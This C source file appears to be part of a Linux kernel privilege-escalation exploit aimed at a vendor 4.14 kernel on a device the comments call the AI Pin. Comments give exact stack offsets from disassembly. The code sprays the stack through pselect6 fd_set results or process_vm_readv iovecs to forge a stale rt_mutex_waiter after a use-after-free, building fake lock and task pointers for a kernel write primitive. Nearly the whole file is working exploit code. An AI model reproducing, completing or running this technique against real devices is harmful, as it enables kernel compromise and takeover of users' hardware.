#include "common.h"

#define PROCESS_VM_ROUTE_ATTEMPTS 8

#if TARGET_USE_PSELECT_RESULT_STAMP
static struct pselect_waiter_stamp main_pselect_stamp;
static atomic_int main_pselect_stamp_ready;
#endif

void fdset_put_word(fd_set *set, int word, uint64_t value) {
  unsigned long *bits = (unsigned long *)set;
  bits[word] = (unsigned long)value;
}

uint64_t fdset_get_word(const fd_set *set, int word) {
  const unsigned long *bits = (const unsigned long *)set;
  return bits[word];
}

static int pselect_stamp_count_bits(const fd_set *set) {
  int total = 0;
  for (int word = 0; word < PSELECT_ROUTE_WORDS_PER_SET; word++) {
    total += __builtin_popcountll(fdset_get_word(set, word));
  }
  return total;
}

int pselect_waiter_stamp_matches(const struct pselect_waiter_stamp *stamp) {
  uint64_t observed[PROCESS_VM_WAITER_WORDS] = {0};
  for (int i = 0; i < 4; i++) {
    observed[i] = fdset_get_word(&stamp->in, i + 1);
  }
  for (int i = 4; i < 9; i++) {
    observed[i] = fdset_get_word(&stamp->out, i - 4);
  }
  observed[9] = fdset_get_word(&stamp->ex, 0);
  return FD_ISSET(PSELECT_ROUTE_SENTINEL_FD, &stamp->in) &&
         memcmp(stamp->expected, observed, sizeof(observed)) == 0;
}

static int pselect_stamp_duplicate_selected(
    const fd_set *in, const fd_set *out, const fd_set *ex, int ready_fd) {
  int opened = 0;
  for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
    if (!FD_ISSET(fd, in) && !FD_ISSET(fd, out) && !FD_ISSET(fd, ex)) {
      continue;
    }
    if (dup2(ready_fd, fd) != fd) {
      return -1;
    }
    opened++;
  }

  /* Force files->fdt.max_fds above n so core_sys_select cannot clamp it. */
  if (dup2(ready_fd, PSELECT_ROUTE_NFDS - 1) !=
      PSELECT_ROUTE_NFDS - 1) {
    return -1;
  }
  return opened;
}

/*
 * Retail .45.20 paired disassembly:
 *
 *   SyS_pselect6 frame      0xa0
 *   core_sys_select frame   0x1c0
 *   stack_fds               core_sp + 0x50
 *   nfds=320                five 64-bit words per set
 *
 * The result maps therefore begin at SP_d-0x198.  The stale waiter begins
 * at SP_d-0x190, so q0..q3 are res_in[1..4], q4..q8 are res_out[0..4],
 * and q9 is res_ex[0].  A readable+writable Unix socket makes every selected
 * bit appear in the result maps; unselected bits remain zero.
 */
int pselect_prepare_waiter_stamp(
    struct pselect_waiter_stamp *stamp,
    const uint64_t words[PROCESS_VM_WAITER_WORDS]) {
  if (!stamp || !words || FD_SETSIZE < PSELECT_ROUTE_NFDS ||
      sizeof(unsigned long) != sizeof(uint64_t)) {
    errno = EINVAL;
    return 0;
  }

  memset(stamp, 0, sizeof(*stamp));
  stamp->ready_fd = -1;
  stamp->peer_fd = -1;
  memcpy(stamp->expected, words, sizeof(stamp->expected));

  for (int i = 0; i < 4; i++) {
    fdset_put_word(&stamp->in, i + 1, words[i]);
  }
  for (int i = 4; i < 9; i++) {
    fdset_put_word(&stamp->out, i - 4, words[i]);
  }
  fdset_put_word(&stamp->ex, 0, words[9]);
  FD_SET(PSELECT_ROUTE_SENTINEL_FD, &stamp->in);

  int pair[2] = {-1, -1};
  if (socketpair(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0, pair) != 0) {
    return 0;
  }
  stamp->ready_fd =
      fcntl(pair[0], F_DUPFD_CLOEXEC, PSELECT_ROUTE_HIGH_FD);
  stamp->peer_fd = fcntl(
      pair[1], F_DUPFD_CLOEXEC,
      stamp->ready_fd >= 0 ? stamp->ready_fd + 1 : PSELECT_ROUTE_HIGH_FD + 1);
  int saved_errno = errno;
  close(pair[0]);
  close(pair[1]);
  errno = saved_errno;
  if (stamp->ready_fd < 0 || stamp->peer_fd < 0) {
    return 0;
  }

  const unsigned char byte = 0x5a;
  if (write(stamp->peer_fd, &byte, sizeof(byte)) !=
      (ssize_t)sizeof(byte)) {
    return 0;
  }

  stamp->opened_fds = pselect_stamp_duplicate_selected(
      &stamp->in, &stamp->out, &stamp->ex, stamp->ready_fd);
  if (stamp->opened_fds < 0) {
    return 0;
  }
  stamp->expected_ret = pselect_stamp_count_bits(&stamp->in) +
                        pselect_stamp_count_bits(&stamp->out) +
                        pselect_stamp_count_bits(&stamp->ex);

  /* Safe preflight: prove the descriptor readiness encoder before the UAF. */
  struct pselect_waiter_stamp check = *stamp;
  struct timespec zero = {.tv_sec = 0, .tv_nsec = 0};
  errno = 0;
  long ret = syscall(SYS_pselect6, PSELECT_ROUTE_NFDS,
                     &check.in, &check.out, &check.ex, &zero, NULL);
  int preflight_errno = errno;
  if (ret != stamp->expected_ret || preflight_errno != 0 ||
      !pselect_waiter_stamp_matches(&check)) {
    errno = EPROTO;
    return 0;
  }
  return 1;
}

int pselect_execute_waiter_stamp(struct pselect_waiter_stamp *stamp) {
  return (int)syscall(SYS_pselect6, PSELECT_ROUTE_NFDS,
                      &stamp->in, &stamp->out, &stamp->ex, NULL, NULL);
}

/*
 * On the AI Pin's vendor 4.14 build, process_vm_rw() reserves 0x190 bytes and
 * rw_copy_check_uvector() copies the eight remote iovecs at initial SP-0x198.
 * The stale rt_mutex_waiter starts at initial SP-0x190, so remote[0].iov_len
 * lands on waiter qword zero and the following fields cover all ten qwords.
 *
 * qword zero is always a kernel pointer.  Interpreted as iov_len it is invalid,
 * making the syscall return EINVAL after the complete 128-byte copy and before
 * it dereferences any of the crafted bases.  The caller must not make another
 * syscall until the consumer has triggered rt_mutex_adjust_pi().
 */
void process_vm_prepare_waiter_stamp(
    struct process_vm_waiter_stamp *stamp,
    const uint64_t words[PROCESS_VM_WAITER_WORDS]) {
  memset(stamp, 0, sizeof(*stamp));
  stamp->local.iov_base = &stamp->sink;
  stamp->local.iov_len = sizeof(stamp->sink);
  stamp->remote[0].iov_len = (size_t)words[0];
  stamp->remote[1].iov_base = (void *)(uintptr_t)words[1];
  stamp->remote[1].iov_len = (size_t)words[2];
  stamp->remote[2].iov_base = (void *)(uintptr_t)words[3];
  stamp->remote[2].iov_len = (size_t)words[4];
  stamp->remote[3].iov_base = (void *)(uintptr_t)words[5];
  stamp->remote[3].iov_len = (size_t)words[6];
  stamp->remote[4].iov_base = (void *)(uintptr_t)words[7];
  stamp->remote[4].iov_len = (size_t)words[8];
  stamp->remote[5].iov_base = (void *)(uintptr_t)words[9];
  stamp->self = getpid();
}

int process_vm_execute_waiter_stamp(
    const struct process_vm_waiter_stamp *stamp) {
  return (int)syscall(
      SYS_process_vm_readv, stamp->self, &stamp->local, 1,
      stamp->remote, 8, 0);
}

int process_vm_stamp_waiter(
    const uint64_t words[PROCESS_VM_WAITER_WORDS]) {
  struct process_vm_waiter_stamp stamp;
  process_vm_prepare_waiter_stamp(&stamp, words);
  return process_vm_execute_waiter_stamp(&stamp);
}

static void build_write_waiter(
    uint64_t words[PROCESS_VM_WAITER_WORDS]) {
  uintptr_t target = pselect_write_target();
  uintptr_t value = pselect_write_value();
  uintptr_t parent = value;
  uintptr_t right = 0;
  uintptr_t left = target;

  if (pselect_write_shape() == 1) {
    if (target < 8) {
      pr_error("process_vm shape1 target underflow target=%016zx\n", target);
    }
    parent = target - 8;
    right = value;
    left = 0;
  }

  const uint64_t waiter[PROCESS_VM_WAITER_WORDS] = {
    parent, right, left,
    parent, right, left,
    fake_task, fake_lock, FAKE_WAITER_PRIO, 0,
  };
  memcpy(words, waiter, sizeof(waiter));
}

int prepare_pselect_fake_lock_route(void) {
#if TARGET_USE_PSELECT_RESULT_STAMP
  if (!page_base || !fake_lock || !fake_task) {
    errno = EINVAL;
    return 0;
  }
  uint64_t words[PROCESS_VM_WAITER_WORDS];
  build_write_waiter(words);
  if (!pselect_prepare_waiter_stamp(&main_pselect_stamp, words)) {
    return 0;
  }
  atomic_store(&main_pselect_stamp_ready, 1);
  pr_info("pselect6 route setup expected_ret=%d opened=%d "
          "page=%016zx lock=%016zx task=%016zx\n",
          main_pselect_stamp.expected_ret, main_pselect_stamp.opened_fds,
          page_base, fake_lock, fake_task);
#endif
  return 1;
}

void do_pselect_fake_lock_route(void) {
#if TARGET_USE_PSELECT_RESULT_STAMP
  if (!atomic_load(&main_pselect_stamp_ready)) {
    pr_error("pselect6 route stamp missing\n");
  }

  atomic_store(&main_route_delay_usec, 0);
  errno = 0;
  int ret = pselect_execute_waiter_stamp(&main_pselect_stamp);
  int saved_errno = errno;

  /* No syscall is permitted until the consumer has used the stamped waiter. */
  atomic_store(&punch_consume_go, 1);
  while (atomic_load(&punch_consume_go) == 1) {
    __asm__ volatile("yield" ::: "memory");
  }

  int exact = pselect_waiter_stamp_matches(&main_pselect_stamp);
  int calls = atomic_load(&consumer_calls);
  int success = atomic_load(&consumer_success);
  pr_info("pselect6 route ret=%d expected=%d errno=%d exact=%d "
          "calls=%d success=%d\n",
          ret, main_pselect_stamp.expected_ret, saved_errno, exact,
          calls, success);
  if (ret != main_pselect_stamp.expected_ret || saved_errno != 0 || !exact) {
    pr_warning("pselect6 route result mismatch\n");
  }
  return;
#else
  if (!page_base || !fake_lock || !fake_task) {
    pr_error("process_vm route missing page=%016zx lock=%016zx task=%016zx\n",
             page_base, fake_lock, fake_task);
  }

  for (int attempt = 1; attempt <= PROCESS_VM_ROUTE_ATTEMPTS; attempt++) {
    if (attempt != 1) {
      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
      if (!page_base || !fake_lock || !fake_task) {
        pr_error("process_vm retry page prepare failed attempt=%d\n", attempt);
      }
    }

    uint64_t words[PROCESS_VM_WAITER_WORDS];
    build_write_waiter(words);

    atomic_store(&consumer_calls, 0);
    atomic_store(&consumer_success, 0);
    atomic_store(&punch_consume_stop, 0);
    atomic_store(&main_route_delay_usec, 0);

    errno = 0;
    int ret = process_vm_stamp_waiter(words);
    int saved_errno = errno;

    /* No syscall is permitted on this thread while the waiter is resident. */
    atomic_store(&punch_consume_go, attempt);
    while (atomic_load(&punch_consume_go) == attempt) {
      __asm__ volatile("yield" ::: "memory");
    }

    int calls = atomic_load(&consumer_calls);
    int success = atomic_load(&consumer_success);
    pr_info("process_vm attempt=%d ret=%d errno=%d calls=%d success=%d\n",
            attempt, ret, saved_errno, calls, success);

    if (ret == -1 && saved_errno != EINVAL) {
      pr_warning("process_vm unexpected stamp errno=%d attempt=%d\n",
                 saved_errno, attempt);
    }
    if (calls > 0 && success > 0) {
      return;
    }
  }

  pr_error("process_vm route exhausted\n");
#endif
}
